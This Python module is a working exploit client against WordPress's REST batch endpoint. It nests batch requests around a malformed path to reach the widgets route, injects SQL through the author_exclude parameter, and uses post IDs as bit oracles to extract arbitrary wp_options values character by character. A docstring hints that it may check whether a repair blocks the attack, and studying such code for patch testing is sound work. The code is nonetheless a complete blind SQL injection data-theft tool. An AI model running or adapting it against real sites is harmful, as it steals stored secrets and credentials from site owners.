"""HTTP-only client for the accepted nested WordPress read chain."""

from __future__ import annotations

from collections.abc import Iterable, Sequence
import json
import urllib.error
import urllib.parse
import urllib.request


MALFORMED_PATH = ":"


class BlockedResponse(RuntimeError):
    """The public application cleanly rejected the nested read request."""


class RemoteFailure(RuntimeError):
    """The public application answered but failed while serving the request."""


def _request_json(url: str, payload: object | None = None) -> object:
    data = None if payload is None else json.dumps(payload).encode()
    headers = {"Accept": "application/json"}
    if payload is not None:
        headers["Content-Type"] = "application/json"
    request = urllib.request.Request(url, data=data, headers=headers)
    try:
        with urllib.request.urlopen(request, timeout=20) as response:
            return json.loads(response.read())
    except urllib.error.HTTPError as error:
        error.read()
        if payload is not None and 400 <= error.code < 500:
            raise BlockedResponse(
                f"nested batch request was rejected (HTTP {error.code})"
            ) from error
        if error.code >= 500:
            raise RemoteFailure(f"WordPress returned HTTP {error.code}") from error
        raise


def _rest_url(base: str, route: str, query: Sequence[tuple[str, str]] = ()) -> str:
    return base.rstrip("/") + "/?" + urllib.parse.urlencode(
        [("rest_route", route), *query]
    )


def _public_ids(base: str) -> tuple[int, ...]:
    def fetch(kind: str) -> list[int]:
        value = _request_json(
            _rest_url(base, f"/wp/v2/{kind}", (("_fields", "id"), ("per_page", "100")))
        )
        if not isinstance(value, list):
            return []
        return [
            int(row["id"])
            for row in value
            if isinstance(row, dict) and "id" in row
        ]

    posts = fetch("posts")
    if not posts:
        return ()
    values: list[int] = []
    for record in fetch("pages") + posts:
        if record not in values:
            values.append(record)
    final_post = posts[-1]
    values.remove(final_post)
    return tuple(values[:5] + [final_post])


def _injection(probes: Sequence[tuple[int, str]]) -> str:
    parts = ["0) AND 0"]
    for index, (record_id, condition) in enumerate(probes):
        close = ")" if index < len(probes) - 1 else ""
        parts.append(f" OR (wp_posts.ID={record_id} AND ({condition}){close}")
    return "".join(parts)


def _payload(probes: Sequence[tuple[int, str]]) -> dict[str, object]:
    query = urllib.parse.urlencode(
        {"author_exclude": _injection(probes), "_fields": "id", "per_page": "100"}
    )
    inner = {
        "requests": [
            {"path": MALFORMED_PATH},
            {"method": "GET", "path": f"/wp/v2/widgets?{query}"},
            {"method": "GET", "path": "/wp/v2/posts"},
        ]
    }
    return {
        "requests": [
            {"path": MALFORMED_PATH},
            {"method": "POST", "path": "/wp/v2/posts", "body": inner},
            {"method": "POST", "path": "/batch/v1"},
        ]
    }


def _observed_ids(value: object) -> set[int]:
    try:
        rows = value["responses"][1]["body"]["responses"][1]["body"]  # type: ignore[index]
    except (IndexError, KeyError, TypeError):
        return set()
    if not isinstance(rows, list):
        return set()
    return {
        int(row["id"])
        for row in rows
        if isinstance(row, dict) and "id" in row
    }


def _chunks(values: Sequence[int], size: int) -> Iterable[Sequence[int]]:
    for offset in range(0, len(values), size):
        yield values[offset : offset + size]


def recover_option(base: str, option: str, *, max_length: int = 96) -> str | None:
    """Recover one ASCII option; return None when a healthy repair blocks it."""
    ids = _public_ids(base)
    if not ids:
        raise RuntimeError("public WordPress posts are unavailable")
    escaped = option.replace("'", "''")
    masks = tuple(1 << bit for bit in range(7))
    recovered: list[str] = []
    for position in range(1, max_length + 1):
        value = 0
        for chunk in _chunks(masks, len(ids)):
            chunk_ids = ids[-len(chunk) :]
            probes = [
                (
                    record_id,
                    "(ASCII(SUBSTRING((SELECT option_value FROM wp_options "
                    f"WHERE option_name='{escaped}'),{position},1)) & {mask}) <> 0",
                )
                for record_id, mask in zip(chunk_ids, chunk, strict=True)
            ]
            body = _request_json(
                _rest_url(base, "/batch/v1"),
                _payload(probes),
            )
            observed = _observed_ids(body)
            for record_id, mask in zip(chunk_ids, chunk, strict=True):
                if record_id in observed:
                    value |= mask
        if value == 0:
            return "".join(recovered) or None
        recovered.append(chr(value))
    return None
